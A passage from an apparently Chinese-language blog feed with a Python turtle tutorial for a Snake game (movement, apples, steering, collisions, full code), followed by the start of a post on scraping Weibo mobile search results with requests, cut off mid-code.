class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">from</span> gamebase <span class="keyword">import</span> square</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置蛇一开始的位置</span></span><br><span class="line">snake = [[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">10</span>,<span class="number">0</span>],[<span class="number">20</span>,<span class="number">0</span>],[<span class="number">30</span>,<span class="number">0</span>],[<span class="number">40</span>,<span class="number">0</span>],[<span class="number">50</span>,<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game_loop_snake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(len(snake)):</span><br><span class="line">        square(snake[n][<span class="number">0</span>], snake[n][<span class="number">1</span>], <span class="number">10</span>, <span class="string">"black"</span>)</span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">420</span>,<span class="number">420</span>,<span class="number">0</span>,<span class="number">0</span>)   <span class="comment">#画布大小为420*420 px</span></span><br><span class="line">    turtle.hideturtle()            <span class="comment">#隐藏画笔的turtle形状</span></span><br><span class="line">    turtle.tracer(<span class="literal">False</span>)           <span class="comment">#取消画图延迟，之间显示画图的结果</span></span><br><span class="line">    game_loop_snake()</span><br><span class="line">    turtle.done()                  <span class="comment">#启动事件循环，停留画布</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E8%B4%AA%E5%90%83%E8%9B%87/12.jpg"  alt="12"></p><h3 id="如何让蛇运动以及吃苹果"><a href="#如何让蛇运动以及吃苹果" class="headerlink" title="如何让蛇运动以及吃苹果"></a>如何让蛇运动以及吃苹果</h3><p>蛇是由六个矩形组成，它们的坐标在一个列表snake里面。通过<code>pop()</code>删除snake[0]，然后通过<code>append()</code>加入新的坐标snake[5]使得蛇运动起来。吃苹果，判断苹果的坐标是否与蛇的坐标相同，如果相同则不需删除snake[0]。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">from</span> gamebase <span class="keyword">import</span> square</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置蛇一开始的位置</span></span><br><span class="line">snake = [[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">10</span>,<span class="number">0</span>],[<span class="number">20</span>,<span class="number">0</span>],[<span class="number">30</span>,<span class="number">0</span>],[<span class="number">40</span>,<span class="number">0</span>],[<span class="number">50</span>,<span class="number">0</span>]]</span><br><span class="line"><span class="comment">#设置蛇一开始走的方向</span></span><br><span class="line">snake_x = <span class="number">10</span></span><br><span class="line">snake_y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gameloop_snake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> snake_x,snake_y,apple_x,apple_y</span><br><span class="line">    <span class="comment">#蛇的移动</span></span><br><span class="line">    snake.append([snake[<span class="number">-1</span>][<span class="number">0</span>] + snake_x, snake[<span class="number">-1</span>][<span class="number">1</span>] + snake_y])<span class="comment">#加入新的坐标到snake[5]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> snake[<span class="number">-1</span>][<span class="number">0</span>]!=apple_x <span class="keyword">or</span> snake[<span class="number">-1</span>][<span class="number">1</span>]!=apple_y:<span class="comment">#判断苹果坐标与蛇头坐标是否相等</span></span><br><span class="line">        snake.pop(<span class="number">0</span>)    <span class="comment">#删除snake[0]</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        apple_x = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">        apple_y = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">        </span><br><span class="line">    turtle.clear()<span class="comment">#清空turtle窗口，但是turtle的位置和状态不会改变</span></span><br><span class="line">    gameloop_apple()<span class="comment">#画出苹果</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(len(snake)):<span class="comment">#遍历列表画出蛇</span></span><br><span class="line">        square(snake[n][<span class="number">0</span>], snake[n][<span class="number">1</span>], <span class="number">10</span>, <span class="string">"black"</span>)</span><br><span class="line">    turtle.ontimer(game_loop_snake,<span class="number">200</span>)<span class="comment"># 200ms后继续调用game_loop_snake，定时器</span></span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gameloop_apple</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> apple_x,apple_y</span><br><span class="line">    square(apple_x, apple_y, <span class="number">10</span>, <span class="string">"red"</span>)</span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">420</span>,<span class="number">420</span>,<span class="number">0</span>,<span class="number">0</span>)   <span class="comment">#画布大小为420*420 px</span></span><br><span class="line">    turtle.hideturtle()            <span class="comment">#隐藏画笔的turtle形状</span></span><br><span class="line">    turtle.tracer(<span class="literal">False</span>)           <span class="comment">#取消画图延迟，之间显示画图的结果</span></span><br><span class="line">    game_loop_snake()</span><br><span class="line">    turtle.done()                  <span class="comment">#启动事件循环，停留画布</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="设置蛇的转向"><a href="#设置蛇的转向" class="headerlink" title="设置蛇的转向"></a>设置蛇的转向</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">from</span> gamebase <span class="keyword">import</span> square</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment">#改变蛇的方向</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">snake_change</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> snake_x,snake_y</span><br><span class="line">    snake_x = x</span><br><span class="line">    snake_y = y</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gameloop_snake</span><span class="params">()</span>:</span></span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">420</span>,<span class="number">420</span>,<span class="number">0</span>,<span class="number">0</span>)   <span class="comment">#画布大小为420*420 px</span></span><br><span class="line">    turtle.hideturtle()            <span class="comment">#隐藏画笔的turtle形状</span></span><br><span class="line">    turtle.tracer(<span class="literal">False</span>)           <span class="comment">#取消画图延迟，之间显示画图的结果</span></span><br><span class="line">    </span><br><span class="line">    turtle.listen()  <span class="comment"># 监听，是否按下键盘</span></span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">0</span>, <span class="number">10</span>), <span class="string">"w"</span>)</span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">0</span>, <span class="number">-10</span>), <span class="string">"s"</span>)</span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">-10</span>, <span class="number">0</span>), <span class="string">"a"</span>)</span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">10</span>, <span class="number">0</span>), <span class="string">"d"</span>)</span><br><span class="line">    </span><br><span class="line">    game_loop_snake()</span><br><span class="line">    turtle.done()                  <span class="comment">#启动事件循环，停留画布</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="判断蛇是否撞到墙和撞到自己"><a href="#判断蛇是否撞到墙和撞到自己" class="headerlink" title="判断蛇是否撞到墙和撞到自己"></a>判断蛇是否撞到墙和撞到自己</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">from</span> gamebase <span class="keyword">import</span> square</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断蛇是否撞墙</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collision</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">-210</span>&lt;=snake[<span class="number">-1</span>][<span class="number">0</span>]&lt;=<span class="number">190</span> <span class="keyword">and</span> <span class="number">-200</span>&lt;=snake[<span class="number">-1</span>][<span class="number">1</span>]&lt;=<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#判断蛇是否撞到自己</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collision_snake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(len(snake)<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">if</span> snake[<span class="number">-1</span>][<span class="number">0</span>] == snake[n][<span class="number">0</span>] <span class="keyword">and</span> snake[<span class="number">-1</span>][<span class="number">1</span>] == snake[n][<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#改变蛇的方向</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">snake_change</span><span class="params">(x,y)</span>:</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game_loop_snake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> snake_x,snake_y,apple_x,apple_y</span><br><span class="line">    <span class="comment">#蛇的移动</span></span><br><span class="line">    snake.append([snake[<span class="number">-1</span>][<span class="number">0</span>] + snake_x, snake[<span class="number">-1</span>][<span class="number">1</span>] + snake_y])<span class="comment">#加入新的坐标到snake[5]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#判断蛇是否撞到墙和撞到自己</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> collision()) <span class="keyword">or</span> collision_snake():</span><br><span class="line">        square(snake[<span class="number">-2</span>][<span class="number">0</span>], snake[<span class="number">-2</span>][<span class="number">1</span>], <span class="number">10</span>, <span class="string">"red"</span>)</span><br><span class="line">        turtle.update()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> snake[<span class="number">-1</span>][<span class="number">0</span>]!=apple_x <span class="keyword">or</span> snake[<span class="number">-1</span>][<span class="number">1</span>]!=apple_y:</span><br><span class="line">        snake.pop(<span class="number">0</span>)    <span class="comment">#删除snake[0]</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        apple_x = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">        apple_y = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">    turtle.clear()<span class="comment"># 清空turtle窗口，但是turtle的位置和状态不会改变</span></span><br><span class="line">    game_loop_apple()</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(len(snake)):<span class="comment">#遍历列表画出蛇</span></span><br><span class="line">        square(snake[n][<span class="number">0</span>], snake[n][<span class="number">1</span>], <span class="number">10</span>, <span class="string">"black"</span>)</span><br><span class="line">    turtle.ontimer(game_loop_snake,<span class="number">150</span>)<span class="comment"># 200ms后继续调用game_loop_snake，定时器</span></span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game_loop_apple</span><span class="params">()</span>:</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">from</span> gamebase <span class="keyword">import</span> square</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置蛇一开始的位置</span></span><br><span class="line">snake = [[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">10</span>,<span class="number">0</span>],[<span class="number">20</span>,<span class="number">0</span>],[<span class="number">30</span>,<span class="number">0</span>],[<span class="number">40</span>,<span class="number">0</span>],[<span class="number">50</span>,<span class="number">0</span>]]</span><br><span class="line"><span class="comment">#设置蛇一开始走的方向</span></span><br><span class="line">snake_x = <span class="number">10</span></span><br><span class="line">snake_y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#画布大小为420*420，因此x轴在(-210,210)，去除边框大小x轴为(200,20)</span></span><br><span class="line">apple_x = randrange(<span class="number">-20</span>,<span class="number">20</span>)*<span class="number">10</span></span><br><span class="line">apple_y = randrange(<span class="number">-20</span>,<span class="number">20</span>)*<span class="number">10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断蛇是否撞墙</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collision</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">-210</span>&lt;=snake[<span class="number">-1</span>][<span class="number">0</span>]&lt;=<span class="number">190</span> <span class="keyword">and</span> <span class="number">-200</span>&lt;=snake[<span class="number">-1</span>][<span class="number">1</span>]&lt;=<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#判断蛇是否撞到自己</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collision_snake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(len(snake)<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">if</span> snake[<span class="number">-1</span>][<span class="number">0</span>] == snake[n][<span class="number">0</span>] <span class="keyword">and</span> snake[<span class="number">-1</span>][<span class="number">1</span>] == snake[n][<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#改变蛇的方向</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">snake_change</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> snake_x,snake_y</span><br><span class="line">    snake_x = x</span><br><span class="line">    snake_y = y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game_loop_snake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> snake_x,snake_y,apple_x,apple_y,snake</span><br><span class="line">    <span class="comment">#蛇的移动</span></span><br><span class="line">    snake.append([snake[<span class="number">-1</span>][<span class="number">0</span>] + snake_x, snake[<span class="number">-1</span>][<span class="number">1</span>] + snake_y])<span class="comment">#加入新的坐标到snake[5]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> collision()) <span class="keyword">or</span> collision_snake():</span><br><span class="line">        square(snake[<span class="number">-2</span>][<span class="number">0</span>], snake[<span class="number">-2</span>][<span class="number">1</span>], <span class="number">10</span>, <span class="string">"red"</span>)</span><br><span class="line">        turtle.update()</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 蛇的变量</span></span><br><span class="line">        snake = [[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">10</span>, <span class="number">0</span>], [<span class="number">20</span>, <span class="number">0</span>], [<span class="number">30</span>, <span class="number">0</span>], [<span class="number">40</span>, <span class="number">0</span>], [<span class="number">50</span>, <span class="number">0</span>]]</span><br><span class="line">        <span class="comment"># 苹果的变量</span></span><br><span class="line">        apple_x = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">        apple_y = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">        <span class="comment"># 蛇的方向坐标</span></span><br><span class="line">        snake_x = <span class="number">10</span></span><br><span class="line">        snake_y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> snake[<span class="number">-1</span>][<span class="number">0</span>]!=apple_x <span class="keyword">or</span> snake[<span class="number">-1</span>][<span class="number">1</span>]!=apple_y:</span><br><span class="line">        snake.pop(<span class="number">0</span>)    <span class="comment">#删除snake[0]</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        apple_x = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">        apple_y = randrange(<span class="number">-20</span>, <span class="number">20</span>) * <span class="number">10</span></span><br><span class="line">    turtle.clear()<span class="comment"># 清空turtle窗口，但是turtle的位置和状态不会改变</span></span><br><span class="line">    game_loop_apple()</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(len(snake)):<span class="comment">#遍历列表画出蛇</span></span><br><span class="line">        square(snake[n][<span class="number">0</span>], snake[n][<span class="number">1</span>], <span class="number">10</span>, <span class="string">"black"</span>)</span><br><span class="line">    turtle.ontimer(game_loop_snake,<span class="number">150</span>)<span class="comment"># 200ms后继续调用game_loop_snake，定时器</span></span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game_loop_apple</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> apple_x,apple_y</span><br><span class="line">    square(apple_x, apple_y, <span class="number">10</span>, <span class="string">"red"</span>)</span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">420</span>,<span class="number">420</span>,<span class="number">0</span>,<span class="number">0</span>)   <span class="comment">#画布大小为420*420 px</span></span><br><span class="line">    turtle.hideturtle()            <span class="comment">#隐藏画笔的turtle形状</span></span><br><span class="line">    turtle.tracer(<span class="literal">False</span>)           <span class="comment">#取消画图延迟，之间显示画图的结果</span></span><br><span class="line">    turtle.listen()  <span class="comment"># 监听，是否按下键盘</span></span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">0</span>, <span class="number">10</span>), <span class="string">"w"</span>)</span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">0</span>, <span class="number">-10</span>), <span class="string">"s"</span>)</span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">-10</span>, <span class="number">0</span>), <span class="string">"a"</span>)</span><br><span class="line">    turtle.onkey(<span class="keyword">lambda</span>: snake_change(<span class="number">10</span>, <span class="number">0</span>), <span class="string">"d"</span>)</span><br><span class="line">    game_loop_snake()</span><br><span class="line">    turtle.done()                  <span class="comment">#启动事件循环，停留画布</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E8%B4%AA%E5%90%83%E8%9B%87/13.jpg"  alt="13"></p>]]></content>
      
      
      <categories>
          
          <category> python游戏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微博搜索爬虫</title>
      <link href="/2020/04/28/%E5%BE%AE%E5%8D%9A%E6%90%9C%E7%B4%A2%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/04/28/%E5%BE%AE%E5%8D%9A%E6%90%9C%E7%B4%A2%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="微博搜索爬虫"><a href="#微博搜索爬虫" class="headerlink" title="微博搜索爬虫"></a>微博搜索爬虫</h1><h2 id="网页分析"><a href="#网页分析" class="headerlink" title="网页分析"></a>网页分析</h2><p>由于网页端反爬虫机制比较完善所以才去移动端进行爬虫。</p><p>url地址：<a href="https://m.weibo.cn/" target="_blank" rel="noopener">https://m.weibo.cn/</a></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1.jpg"  alt="1"></p><p>搜索框，输入关键词进行搜索</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/2.jpg"  alt="2"></p><p>对网页进行抓包，找到相关数据</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/3.jpg"  alt="3"></p><p>查看数据是否与网页的内容相同</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/4.png"  alt="4"></p><p>分析多组数据的请求头</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/5.jpg"  alt="5"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/6.jpg"  alt="6"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/7.jpg"  alt="7"></p><h2 id="编写程序"><a href="#编写程序" class="headerlink" title="编写程序"></a>编写程序</h2><h3 id="构造url地址"><a href="#构造url地址" class="headerlink" title="构造url地址"></a>构造url地址</h3><p>通过网页分析构造url地址对，地址信息访问。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造搜索内容</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'containerid'</span>:<span class="string">'100103type=1&amp;q=电影'</span>,</span><br><span class="line"><span class="string">'page_type'</span>:<span class="string">'searchall'</span>,</span><br><span class="line"><span class="string">'page'</span>:<span class="string">'1'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#反爬虫，模拟游览器访问</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'</span>,&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://m.weibo.cn/api/container/getIndex?"</span></span><br><span class="line"><span class="comment">#通过GET方式访问该网站</span></span><br><span class="line">html = requests.get(url,headers=headers,params=data)</span><br><span class="line"><span 